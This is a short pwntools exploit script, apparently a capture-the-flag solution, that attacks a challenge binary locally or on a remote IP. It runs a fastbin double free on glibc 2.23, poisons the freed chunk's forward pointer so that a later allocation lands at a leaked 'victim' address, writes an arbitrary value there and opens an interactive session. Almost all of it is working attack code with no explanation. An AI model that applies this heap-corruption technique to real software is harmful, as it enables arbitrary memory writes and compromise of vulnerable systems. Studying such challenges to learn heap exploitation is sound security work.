#!/usr/bin/python3

from pwn import *
import sys
import tty

# change those
LIBC = './libc-2.23.so'
HOST = '140.110.112.77'
PORT = 9001

libc = ELF( LIBC )
context.arch = 'amd64'

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else:
    r = process('./F', env={"LD_PRELOAD": LIBC})

r.recvuntil('victim\'s address:')
victim = int(r.recvline()[:-1], 16)

r.recvuntil('size\'s address:')
size = int(r.recvline()[:-1], 16)

log.info(f"victim: {hex(victim)}, size: {hex(size)}")

def m(idx):
    r.sendlineafter('input: ', str(1))
    r.sendlineafter('x = ', str(idx))

def f(idx):
    r.sendlineafter('input: ', str(0))
    r.sendlineafter('x = ', str(idx))

def w(idx, c):
    r.sendlineafter('input: ', str(2))
    r.sendlineafter('x = ', str(idx))
    r.sendlineafter('string = ', c)

def s(idx):
    r.sendlineafter('input: ', str(3))
    r.sendlineafter('x = ', str(idx))

m(0)
m(1)
m(2) # protect colidate

# double free
f(0)
f(1)
f(0) # twice

m(2) # 0
m(2) # 1
w(0, p64(victim-0x10)) # fd ptr
m(2) # 0
m(3) # victim
w(3, p64(0xdeadbeef))

#r.close()
r.interactive()
